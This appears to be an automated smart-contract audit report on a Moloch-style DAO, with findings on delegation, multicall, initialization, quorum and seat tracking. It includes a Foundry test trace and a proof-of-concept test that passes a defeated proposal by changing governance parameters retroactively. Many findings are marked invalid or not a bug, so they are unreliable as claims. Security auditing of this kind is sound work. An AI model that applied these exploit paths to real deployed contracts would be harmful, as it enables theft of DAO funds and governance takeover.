    ├─ [30087] → new Target@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 150 bytes of code
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    └─ ← [Stop]

  [36272] OpenProposalHijackTest::test_OpenProposalHijackCensorsProposal()
    ├─ [7101] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F::proposalId(0, Target: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0, 0x55241077000000000000000000000000000000000000000000000000000000000000007b, 0x0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   ├─ [4395] Moloch::proposalId(0, Target: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], 0, 0x55241077000000000000000000000000000000000000000000000000000000000000007b, 0x0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   └─ ← [Return] 84797663204719739251246136951864567871622047585873703697932549773467820864955 [8.479e76]
    │   └─ ← [Return] 84797663204719739251246136951864567871622047585873703697932549773467820864955 [8.479e76]
    ├─ [0] VM::prank(0x0000000000000000000000000000000000000B0b)
    │   └─ ← [Return]
    ├─ [15697] 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F::openProposal(84797663204719739251246136951864567871622047585873703697932549773467820864955 [8.479e76])
    │   ├─ [15534] Moloch::openProposal(84797663204719739251246136951864567871622047585873703697932549773467820864955 [8.479e76]) [delegatecall]
    │   │   ├─ [5521] 0x4050D27825eC26E5628Be3d693D1D5f7099d9f66::getVotes(0x0000000000000000000000000000000000000B0b) [staticcall]
    │   │   │   ├─ [2857] Shares::getVotes(0x0000000000000000000000000000000000000B0b) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Revert] Unauthorized()
    │   └─ ← [Revert] Unauthorized()
    └─ ← [Revert] Unauthorized()

Backtrace:
  at Moloch.openProposal
  at 0x1d9e93D0A9E27BEBce5342828243526c3Ef8D13F.openProposal
  at OpenProposalHijackTest.test_OpenProposalHijackCensorsProposal

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 3.02ms (159.69µs CPU time)

Ran 1 test suite in 24.79ms (3.02ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/MolochHarness.t.sol:OpenProposalHijackTest
[FAIL: Unauthorized()] test_OpenProposalHijackCensorsProposal() (gas: 36272)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test
```

---

# Zero-balance seats ignored in minimum
**#17**
- Severity: High
- Validity: Invalid

## Targets
- _recomputeMin (Badges)

## Affected Locations
- **Badges._recomputeMin**: Single finding location

## Description

The minimum-balance recomputation skips any occupied seat whose snapshot balance is zero. When `onSharesChanged` updates a holder’s `seats[i].bal` to 0 (e.g., their shares drop to zero), that seat is still in the `occupied` bitset but is excluded from the minimum calculation. This makes `minBal` track the smallest positive balance rather than the true minimum and points `minSlot` at a non‑zero seat. The eviction logic for competitive allocation relies on `minBal/minSlot` to decide whether a new candidate can replace the lowest seat. As a result, a zero-balance occupant can persist and block candidates whose balances are above zero but below the smallest positive balance.

## Root cause

`_recomputeMin` filters seats with `b == 0` even though `occupied` already identifies valid seats, so zero-balance occupants are never considered for the minimum.

## Impact

A badge holder can drop their share balance to zero yet remain in the ranked set and avoid eviction by moderate-balance entrants. This allows seat squatting and denies access to otherwise eligible users unless they exceed the smallest positive balance among existing holders.

## Remediation

**Status:** Incomplete

### Explanation

Modify `_recomputeMin` to include all `occupied` seats in the minimum calculation even when their balance is zero, so zero-balance holders can be identified as the minimum and evicted. Alternatively, clear the `occupied` flag when a holder’s balance reaches zero and remove them from the ranked set, ensuring they cannot squat indefinitely.

---

# Unbounded split loop can block balance changes
**#19**
- Severity: High
- Validity: Invalid

## Targets
- _applyVotingDelta (Shares)

## Affected Locations
- **Shares._applyVotingDelta**: Single finding location

## Description

The function pulls the caller’s current split delegation via `_currentDistribution` and then allocates two arrays sized to the full split list before looping over every delegate to move votes. Because the split list is user-controlled, the gas cost of `_applyVotingDelta` grows linearly with the number of delegates. If a user creates an extremely large split array, any balance change that triggers this function (transfers, DAO burns, minting) can exceed the block gas limit and revert. This makes the account’s shares effectively non-transferable and can prevent the DAO from burning or slashing that balance. The issue stems from processing an unbounded user-controlled array in a critical balance-update path.

## Root cause

`_applyVotingDelta` iterates over the full `_splits[account]` array without enforcing any maximum length, so user-controlled split size directly dictates gas usage for balance changes.

## Impact

A malicious holder can make transfers or DAO-initiated burns involving their account fail due to gas exhaustion, effectively freezing their balance and evading DAO-controlled burns. This can also grief third parties who attempt to transfer shares to that account because the transaction will revert.

## Remediation

**Status:** Incomplete

### Explanation

Add a hard upper bound on the number of splits per account and enforce it when adding/updating splits (optionally provide a merge/consolidation path), so `_applyVotingDelta` only iterates over a small, bounded array and balance changes can’t be gas‑griefed.

---

# Split setup can inflate voting power
**#21**
- Severity: High
- Validity: Invalid

## Targets
- setSplitDelegation (Shares)

## Affected Locations
- **Shares.setSplitDelegation**: Single finding location

## Description

`setSplitDelegation` snapshots the current distribution with `_currentDistribution` and only afterwards calls `_autoSelfDelegate`, before overwriting `_splits` and repointing votes. If the caller has not previously delegated, `_autoSelfDelegate` will change the delegator’s delegate to self and (as a delegation action) shift voting power to that new delegate. The subsequent `_repointVotesForHolder` uses the stale `oldD/oldB` snapshot, so it credits the split delegates without removing the just‑self‑delegated votes. This causes the holder’s voting power to be counted twice: once on the self delegate created by `_autoSelfDelegate` and again across the split delegates. A holder can trigger this by calling `setSplitDelegation` as their first delegation action, inflating governance power beyond their share balance.

## Root cause

`setSplitDelegation` captures the old distribution before calling `_autoSelfDelegate`, so `_repointVotesForHolder` operates on a stale snapshot after delegation state has already changed.

## Impact

An attacker can mint voting power in excess of their share balance by setting a split delegation from an undelegated state. This inflated voting power can be used to pass governance actions that the attacker would not otherwise control, potentially enabling hostile proposals or treasury actions if governance is privileged.

## Remediation

**Status:** Incomplete

### Explanation

Modify `setSplitDelegation` so `_autoSelfDelegate` runs before you snapshot the “old” distribution, or otherwise recompute the old distribution after auto‑delegation, ensuring `_repointVotesForHolder` compares the true pre‑ and post‑state and cannot credit extra votes.

---

# Auto-futarchy can overcommit unbacked pools
**#23**
- Severity: High
- Validity: Invalid

## Targets
- openProposal (Moloch)

## Affected Locations
- **Moloch.openProposal**: Single finding location

## Description

`setAutoFutarchy` enables a non‑zero `autoFutarchyParam`, and any caller that meets `proposalThreshold` can trigger `openProposal` to auto‑fund a futarchy pool. In `openProposal`, the computed `amt` is added to `futarchy[id].pool` for ETH or arbitrary ERC20 reward tokens without checking the contract’s balance or reserving funds. This means a malicious proposer can repeatedly open proposals and inflate per‑proposal pools far beyond the DAO’s actual holdings. The futarchy payout path later relies on `F.pool` to compute transfers, so these unbacked pools either drain all available reward tokens to early claimants or cause `cashOutFutarchy` to revert once the balance is exhausted. The result is a griefing vector and potential payout failure for legitimate participants.

## Root cause

The auto‑funding path increments `futarchy[id].pool` based solely on `autoFutarchyParam` without enforcing that sufficient reward tokens exist or are reserved, and there is no global cap on total committed pool amounts.

## Impact

An attacker can open many proposals to create futarchy pools that collectively exceed the DAO’s reward token balance. When those pools resolve, payouts can revert due to insufficient funds or drain the full treasury balance to early claimants, leaving later claimants unpaid. This can lock or underfund futarchy payouts and deplete the DAO’s reward token reserves.

## Remediation

**Status:** Incomplete

### Explanation

Add accounting for committed reward tokens and enforce that `openProposal` only auto-funds a futarchy pool if enough unallocated rewards remain, ideally by transferring/reserving the pool amount in escrow at proposal creation. Reject new auto‑funded proposals when the DAO’s available reward token balance (or remaining cap) cannot cover the requested pool so total pools can never exceed backing.

---

# Multicall reuses `msg.value` for payments
**#24**
- Severity: High
- Validity: Invalid

## Targets
- multicall (Moloch)

## Affected Locations
- **Moloch.multicall**: Single finding location

## Description

The `multicall` function executes arbitrary payloads via `delegatecall`, which preserves the original `msg.value` for every internal call in the batch. Both `buyShares` and `fundFutarchy` treat `msg.value` as the payment for that specific call and update sale caps or futarchy pools accordingly, with `buyShares` even refunding any excess. Because `multicall` does not track how much ETH has already been consumed, an attacker can bundle multiple purchases or futarchy fundings in a single transaction while only sending ETH once. Each call will pass its payment checks and mint shares or credit the pool as if fully paid. This allows underpaying for shares/loot and can even drain existing ETH through repeated refunds, leading to loss of treasury funds and governance dilution.

## Root cause

`multicall` uses `delegatecall` without value accounting, so payable functions that rely on `msg.value` can be executed multiple times using the same ETH.

## Impact

An attacker can buy multiple batches of shares or loot while paying only once, gaining disproportionate voting power and potentially ragequitting to withdraw more treasury assets than they paid for. They can also inflate futarchy pools without funding them, then cash out unbacked payouts that are paid from the DAO’s treasury. This results in direct financial loss and governance compromise for the DAO.

## Remediation

**Status:** Incomplete

### Explanation

Modify `multicall` to track and allocate ETH per subcall (e.g., accept per‑call values and decrement a remaining balance, reverting if the total exceeds `msg.value`), and update payable entrypoints to consume the allocated amount instead of raw `msg.value` so the same ETH cannot be reused across batched delegatecalls.

---

# Transfer lock calls always revert
**#22**
- Severity: Medium
- Validity: Invalid

## Targets
- setTransfersLocked (Moloch)

## Affected Locations
- **Moloch.setTransfersLocked**: Single finding location

## Description

`Moloch.setTransfersLocked` is meant to toggle the transfer lock on both the Shares and Loot modules, but it relies on each module’s `setTransfersLocked` to succeed. Those module functions are guarded by an `onlyDAO` modifier that requires `msg.sender == address(this)` of the module contract itself. When Moloch calls into those modules, `msg.sender` is the Moloch contract, so the authorization check fails and the call reverts. As a result, the DAO can never change the `transfersLocked` flag in either module. The transfer-lock feature is effectively unusable despite being exposed through governance.

## Root cause

The Shares and Loot `onlyDAO` modifier compares `msg.sender` to the module’s own `address(this)` instead of the DAO contract address, so external calls from Moloch always fail authorization.

## Impact

Governance cannot lock or unlock share/loot transfers, so holders can keep transferring even after the DAO votes to freeze transfers during an emergency. If the modules were initialized as locked, they can never be unlocked, permanently freezing those tokens. This removes an intended safety control and can undermine protocol responses to incidents.

## Remediation

**Status:** Incomplete

### Explanation

Modify the Shares/Loot `onlyDAO` modifier to authorize the actual DAO contract address (stored during initialization) instead of `address(this)`, and ensure the module stores the correct Moloch address so `setTransfersLocked` calls from the DAO pass authorization.

---

# Permissionless `init` lets attacker become DAO
**#1**
- Severity: Low
- Validity: Low-confidence
> **Review: Not a bug.** Atomic deployment via Summoner factory ensures `init` is called in the same transaction as deployment. Not exploitable through the intended deployment path.

## Targets
- init (Loot)
- init (Badges)
- init (Shares)

## Affected Locations
- **Loot.init**: `init` sets `DAO = msg.sender` guarded only by `DAO == address(0)`, so any first caller can permanently install themselves as the DAO; restricting this assignment (or setting it in the constructor/factory) removes the takeover vector.
- **Badges.init**: `init` assigns the sole privileged `DAO` address from `msg.sender` with no authentication beyond a zero-check, allowing an attacker to claim DAO authority and thereby control all `onlyDAO`-protected badge/seat operations.
- **Shares.init**: `init` both sets `DAO = msg.sender` under only a zero-check and mints the initial shares based on caller-supplied inputs, enabling a first-caller attacker to seize the DAO role and choose an arbitrary initial distribution.

## Description

Across `Loot`, `Badges`, and `Shares`, the `init` function is publicly callable and only checks `DAO == address(0)` before setting `DAO = msg.sender`. Because `DAO` is the single authority used by the `onlyDAO` access control pattern, the first account to call `init` permanently decides who can perform all DAO-gated administrative actions. If deployment does not atomically initialize these contracts (e.g., via constructor/factory in the same transaction), an attacker can race to call `init` first and seize the privileged role. After hostile initialization, the intended DAO cannot recover because re-initialization is blocked by the one-time `DAO`-set guard. In `Shares`, this is compounded by the ability to mint an attacker-chosen initial distribution during `init`, immediately capturing governance power.

## Root cause

`init` authenticates initialization only by checking `DAO` is unset and then assigns `DAO` from `msg.sender`, so any first caller can set the trusted admin address used by `onlyDAO`.

## Impact

An attacker who initializes first gains permanent control over DAO-only capabilities such as minting, burning, modifying seat/membership state, and toggling transfer locks. They can arbitrarily inflate or destroy balances/badges/shares, freeze transfers, and subvert any governance or membership systems that rely on these tokens, forcing a redeploy or migration to recover control.

---

# Initializer bypasses quorumBps bounds
**#2**
- Severity: Low
- Validity: Low-confidence
> **Review: Not a bug.** Init-time validation concern. The Summoner/UI should validate inputs. Not exploitable post-deployment since `quorumBps` is set at init and only changeable via `onlyDAO`.

## Targets
- init (Moloch)

## Affected Locations
- **Moloch.init**: Single finding location

## Description

The contract enforces a `bps <= 10_000` invariant in `setQuorumBps`, but `init` writes `quorumBps` without any upper‑bound validation. The `state` function assumes this invariant holds and computes the quorum threshold as `quorumBps * supplySnapshot / 10_000`. If `init` sets `quorumBps` above 10,000, the required quorum exceeds total voting supply, so proposals remain `Active` (or only ever expire) and never reach `Succeeded`. Because `setQuorumBps` is `onlyDAO`, an invalid value set at initialization can permanently prevent governance from updating itself or executing proposals.

## Root cause

`init` writes `quorumBps` without validating the same bounds that `setQuorumBps` enforces, so the invariant expected by `state` is not preserved across all write paths.

## Impact

A malicious or compromised summoner can initialize the DAO with an impossible quorum and effectively freeze governance. Proposals cannot ever succeed, which blocks treasury actions and prevents the DAO from fixing the parameter through `onlyDAO` updates.

---

# ERC20 approve allowance race
**#3**
- Severity: Low
- Validity: Low-confidence
> **Review: Not a bug.** Standard ERC-20 behavior present in every conformant implementation. Universally accepted across the ecosystem.

## Targets
- approve (Loot)
- approve (Shares)

## Affected Locations
- **Loot.approve**: `approve` directly replaces `allowance[owner][spender]` even when it is already non-zero, so a spender can exploit ordering with `transferFrom` to consume the old allowance and still receive the new one; requiring zero-first or using `increaseAllowance`/`decreaseAllowance` here removes the overwrite race.
- **Shares.approve**: `approve` unconditionally overwrites an existing allowance, allowing a spender to front-run an allowance change and use both the pre-change and post-change approvals; enforcing a zero-reset or incremental allowance changes at this point prevents the double-spend behavior.

## Description

Both `Loot.approve` and `Shares.approve` implement the classic ERC-20 allowance race by unconditionally overwriting an existing non-zero allowance with a new non-zero value. Because a spender’s `transferFrom` can be mined before the owner’s pending `approve`, the spender can consume the old allowance first, then still retain the newly set allowance after `approve` is mined. This creates a cross-function interleaving between `approve` and `transferFrom` where the owner’s intended “replace allowance X with Y” instead behaves like “allow spending up to X, then also up to Y.” The issue is triggered specifically when changing allowances from a non-zero value to another non-zero value. Preventing this requires making allowance updates non-overwriteable in a single step (e.g., enforce zero-first) or using monotonic adjustment methods (`increaseAllowance`/`decreaseAllowance`) so a spender cannot benefit from transaction reordering.

## Root cause

`approve` overwrites an existing allowance without enforcing a zero-reset or using increase/decrease semantics, enabling front-running with `transferFrom` to spend both old and new allowances.

## Impact

A malicious approved spender can front-run an allowance-change transaction and spend the old allowance before the new approval is applied, then spend again using the new allowance. This allows the spender to transfer more tokens/shares than the owner intended during an allowance update, limited by the owner’s balance and the combined old+new allowance amounts.

---

# Seat tracking desync on mint/burn
**#4**
- Severity: Low
- Validity: Low-confidence
> **Review: Not a bug.** `onSharesChanged` maintains the auxiliary structures. The audit misunderstands the eviction flow. No concrete failing PoC provided.

## Targets
- mintSeat (Badges)
- burnSeat (Badges)
- onSharesChanged (Badges)

## Affected Locations
- **Badges.mintSeat**: `mintSeat` updates only ownership mappings (`_ownerOf`, `seatOf`, `balanceOf`) but does not mark the seat in `occupied` or insert/update it in the `seats` ranking and `min*` invariants, so callers can mint a seat that the tracking structures still consider free.
- **Badges.burnSeat**: `burnSeat` clears ownership and snapshot balance but does not clear the corresponding bit in `occupied` or remove/update the entry in the `seats` ranking and `min*` invariants, leaving burned seats appearing occupied and ranked even though ownership is gone.
- **Badges.onSharesChanged**: `onSharesChanged` is reachable during share updates and drives mint/burn decisions using `_firstFree`, `minSlot`, and `minBal`; it exposes the desynchronization because it assumes the auxiliary seat-tracking structures match `_ownerOf`/`seatOf` when it calls `mintSeat`/`burnSeat`.

## Description

The contract maintains two parallel representations of seat state: ERC721-style ownership mappings (`_ownerOf`, `seatOf`, `balanceOf`) and auxiliary seat-tracking structures (the `seats` ranked list, the `occupied` bitset, and `minBal`/`minSlot` invariants). `onSharesChanged` assumes these representations are always synchronized when it selects a free seat (`_firstFree`) or chooses the minimum-balance holder to evict. However, `mintSeat` and `burnSeat` only mutate the ownership-side mappings and snapshot balance, leaving the bitset/ranking/minimum-tracking stale. Once desynchronized, later `onSharesChanged` executions can attempt to mint into an already-owned seat (reverting in `mintSeat`), treat burned seats as still occupied, or evict/select non-existent holders based on stale ranking data. Over time, this can freeze allocation/eviction logic or cause seats to become effectively unusable until manual state repair.

## Root cause

`mintSeat`/`burnSeat` do not update the canonical `seats`/`occupied`/`minBal`/`minSlot` tracking that other logic relies on, allowing the system’s two state representations to diverge.

## Impact

Any path that invokes `mintSeat`/`burnSeat` without maintaining the auxiliary structures can create ghost-occupied seats, undiscoverable free slots, and incorrect minimum-holder selection. Subsequent share changes may revert during mint/burn, skip valid allocations, or mis-evict, effectively stalling badge issuance and corrupting membership/seat reporting until the state is repaired.

---

# `init()` can be called repeatedly
**#5**
- Severity: Low
- Validity: Low-confidence
> **Review: Low risk.** `SUMMONER` is `msg.sender` at constructor time (the factory). Only the Summoner factory could call `init` again. An `initialized` guard is good hardening for v2.

## Targets
- init (Moloch)
- setMetadata (Moloch)
- chat (Moloch)
- onSharesChanged (Moloch)

## Affected Locations
- **Moloch.init**: `init()` has no initialized-state check and re-runs initialization logic, allowing `SUMMONER` to overwrite `_orgName` and replace the `badges` pointer; adding an `initialized` guard (or equivalent) here is what prevents post-deploy reconfiguration.
- **Moloch.setMetadata**: `setMetadata()` is intended to be the governance-controlled path for post-deploy metadata changes, but its protection is effectively bypassed because `init()` can still rewrite `_orgName` without `onlyDAO` approval.
- **Moloch.chat**: `chat` consults the mutable `badges` address for gating; once `init()` replaces `badges`, `chat` starts using the new empty badge ledger, propagating the reinitialization into incorrect authorization decisions.
- **Moloch.onSharesChanged**: `onSharesChanged` reads/writes against whatever `badges` points to; after `init()` re-deploys and swaps `badges`, share-driven badge updates apply to a different contract than existing members’ badge balances.

## Description

`Moloch.init()` is callable by `SUMMONER` but lacks any one-time initialization guard, so it can be executed again after the DAO is already live. Each re-execution overwrites initialization-time state that other parts of the system assume is immutable post-deploy, including `_orgName` and the `badges` contract pointer. This creates a privileged backdoor path that bypasses the intended governance-controlled surface (for example, metadata changes via `setMetadata()` guarded by `onlyDAO`). It also invalidates assumptions made by badge-gated features that `badges` continues to reference the original badge ledger. As a result, the SUMMONER can change DAO identity metadata and effectively reset/replace membership gating after users have already relied on the deployed configuration.

## Root cause

`init()` does not enforce a one-time initialization state, allowing the `SUMMONER` to re-run initialization logic and overwrite critical configuration variables.

## Impact

The SUMMONER can unilaterally rename the DAO or otherwise alter initialization-set metadata without going through DAO governance, misleading users and integrators who rely on on-chain identifiers. The SUMMONER can also replace the `badges` contract with a fresh instance, locking out existing badge holders from badge-gated actions (e.g., chat) and re-seeding access under a new badge ledger.

---

# Governance params not snapshotted per proposal
**#6**
- Severity: Low
- Validity: Low-confidence
> **Review: Deliberate design choice.** Standard pattern (early Compound Governor works the same way). Snapshotting params per-proposal adds significant storage cost. Parameter changes require governance approval, so the same majority that changes params is the one affected.

## Targets
- state (Moloch)
- executeByVotes (Moloch)
- setMinYesVotesAbsolute (Moloch)
- setQuorumAbsolute (Moloch)
- setTimelockDelay (Moloch)

## Affected Locations
- **Moloch.state**: `state()` evaluates proposals against the current global `minYesVotesAbsolute`, `quorumAbsolute`, and `timelockDelay` rather than values snapshotted per proposal/queue, so changing these globals retroactively changes outcomes and phase transitions; snapshotting and using per-proposal values here remediates the retroactive behavior.
- **Moloch.executeByVotes**: `executeByVotes()` recomputes unlock timing using the current global `timelockDelay`, so a later delay change can cause already-queued proposals to execute earlier or later than originally intended, directly impacting when protected actions can be executed.
- **Moloch.setMinYesVotesAbsolute**: Any caller authorized by governance to change parameters can update `minYesVotesAbsolute`, and because proposal resolution reads the latest value, this call can retroactively alter success conditions for proposals that already have votes or are queued.
- **Moloch.setQuorumAbsolute**: This governance-controlled setter allows changing `quorumAbsolute` after vote totals are known, and the updated global quorum is then applied to all existing proposals when their `state()` is computed.
- **Moloch.setTimelockDelay**: This setter can change `timelockDelay` after proposals have been queued, and since queued proposals don’t store the delay used at queue time, the change immediately affects when those proposals become executable.

## Description

Several governance-critical thresholds (`minYesVotesAbsolute`, `quorumAbsolute`, and `timelockDelay`) are stored as mutable global variables and are read dynamically when computing a proposal’s `state()` and executability. Because proposals only record timestamps/vote totals and do not snapshot the threshold values that applied when voting started or when a proposal was queued, later parameter updates apply retroactively to proposals already in flight. This allows a majority (or temporary coalition) to observe vote outcomes and then change the rules to flip a proposal from failed to succeeded, or to reclassify/indefinitely stall proposals by raising thresholds. Similarly, changing the timelock delay after queueing can shorten or extend the waiting period for already-queued proposals, undermining the timelock’s predictability. The result is that proposal outcomes and execution windows depend on subsequent configuration changes rather than the rules voters relied on when participating.

## Root cause

Proposal evaluation and execution logic reads mutable global governance parameters instead of using per-proposal (or per-queue) snapshotted values fixed at the time the proposal entered that phase.

## Impact

An attacker who can pass parameter-change proposals can retroactively change which proposals pass, fail, or remain executable, enabling execution of actions that did not satisfy the original rules or blocking actions that previously met them. By increasing quorum/min-yes or extending timelock delay, governance can be stalled or queued actions can be postponed indefinitely; by decreasing them, queued actions can execute earlier than stakeholders expected, reducing reaction time for exits or countermeasures.

## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "forge-std/Test.sol";
import "src/Moloch.sol";

contract MolochGovernanceParamsSnapshotTest is Test {
    function testGovernanceParamsNotSnapshotted() public {
        Moloch moloch = new Moloch();

        address alice = makeAddr("alice");
        address bob = makeAddr("bob");

        address[] memory holders = new address[](2);
        holders[0] = alice;
        holders[1] = bob;
        uint256[] memory shares = new uint256[](2);
        shares[0] = 60;
        shares[1] = 40;

        Call[] memory initCalls = new Call[](1);
        initCalls[0] = Call({
            target: address(moloch),
            value: 0,
            data: abi.encodeCall(Moloch.setMinYesVotesAbsolute, (uint96(100)))
        });

        moloch.init("DAO", "DAO", "", 0, false, address(0), holders, shares, initCalls);

        vm.roll(block.number + 1);

        uint8 op = 0;
        address to = address(moloch);
        uint256 value = 0;

        bytes memory dataA = abi.encodeCall(Moloch.setRagequittable, (true));
        bytes32 nonceA = bytes32("A");
        uint256 idA = moloch.proposalId(op, to, value, dataA, nonceA);

        vm.prank(alice);
        moloch.castVote(idA, 1);

        assertEq(uint256(moloch.state(idA)), uint256(Moloch.ProposalState.Defeated));

        vm.expectRevert(Moloch.NotOk.selector);
        moloch.executeByVotes(op, to, value, dataA, nonceA);

        bytes memory dataB = abi.encodeCall(Moloch.setMinYesVotesAbsolute, (uint96(50)));
        bytes32 nonceB = bytes32("B");
        uint256 idB = moloch.proposalId(op, to, value, dataB, nonceB);

        vm.prank(alice);
        moloch.castVote(idB, 1);
        vm.prank(bob);
        moloch.castVote(idB, 1);

        assertEq(uint256(moloch.state(idB)), uint256(Moloch.ProposalState.Succeeded));

        moloch.executeByVotes(op, to, value, dataB, nonceB);
        assertEq(moloch.minYesVotesAbsolute(), 50);

        assertEq(uint256(moloch.state(idA)), uint256(Moloch.ProposalState.Succeeded));

        moloch.executeByVotes(op, to, value, dataA, nonceA);
        assertTrue(moloch.ragequittable());
    }
}
```

---

# Out-of-range seat not marked used
**#16**
- Severity: Low
- Validity: Invalid

## Targets
- _setUsed (Badges)

## Affected Locations
- **Badges._setUsed**: Single finding location

## Description

`_setUsed` marks a seat as occupied by shifting `1` left by `slot` and OR-ing it into `occupied`. Because `slot` is a `uint16` and there is no bounds check, values greater than 255 are accepted. In the EVM, shifting by an amount ≥256 yields zero, so `occupied |= (1 << slot)` becomes a no-op for out-of-range slots. When `onSharesChanged` assigns a seat and calls `_setUsed`, any out-of-range slot silently leaves `occupied` unchanged even though other seat bookkeeping is likely updated. This desynchronizes the occupancy bitset from actual seat assignments and undermines the 256-seat invariant.

## Root cause

The function trusts `slot` without enforcing `slot < 256`, and EVM shift semantics silently zero out the mask for out-of-range values.

## Impact

If an attacker can induce an out-of-range slot in the seat assignment path, they can receive a badge without consuming a bit in `occupied`. Subsequent allocations will treat that slot as free, allowing duplicate seat assignments or exceeding the 256-seat cap, which can distort eviction and ranking logic.

## Remediation

**Status:** Incomplete

### Explanation

Add an explicit bounds check in `_setUsed` (and any callers that compute slots) to require `slot < 256` and revert otherwise, so out‑of‑range values cannot bypass the occupancy bit and all seat assignments always consume a valid bit.

---

# Total supply checkpoints miss mint updates
**#20**
- Severity: Low
- Validity: Invalid

## Targets
- init (Shares)

## Affected Locations
- **Shares.init**: Single finding location

## Description

`_totalSupplyCheckpoints` is the sole source of historical total supply for `getPastTotalSupply`, but it is only updated when `burnFromMoloch` calls `_writeTotalSupplyCheckpoint`. Both `init` and `mintFromMoloch` increase `totalSupply` through `_mint` without writing a checkpoint, so supply increases are never recorded in the checkpoint array. This creates a cross-function mismatch where the live `totalSupply` grows but `getPastTotalSupply` keeps returning the last burned checkpoint value (or zero before any burn). Any on-chain governance or vote-quorum logic that relies on `getPastTotalSupply` will compute against an artificially low supply. As a result, historical queries become unreliable precisely when the token is minted, which is the common path for DAO issuance.

## Root cause

Minting paths (`init` and `mintFromMoloch`) update `totalSupply` without calling `_writeTotalSupplyCheckpoint`, so the checkpoint array only reflects burns and not mints.

## Impact

Historical total supply queries underreport supply after any mint, which can skew quorum or threshold calculations that depend on past supply snapshots. An attacker can exploit this by proposing or voting when the recorded past supply is low, enabling outcomes that would not pass with the correct total supply. This can lead to incorrect governance decisions and acceptance of proposals with insufficient real voting power.

## Remediation

**Status:** Incomplete

### Explanation

Update the minting paths to write total supply checkpoints whenever `totalSupply` increases. Add a `_writeTotalSupplyCheckpoint()` call after `totalSupply` updates in `init` and `mintFromMoloch` (or centralize in a shared mint hook) so checkpoints reflect both mints and burns.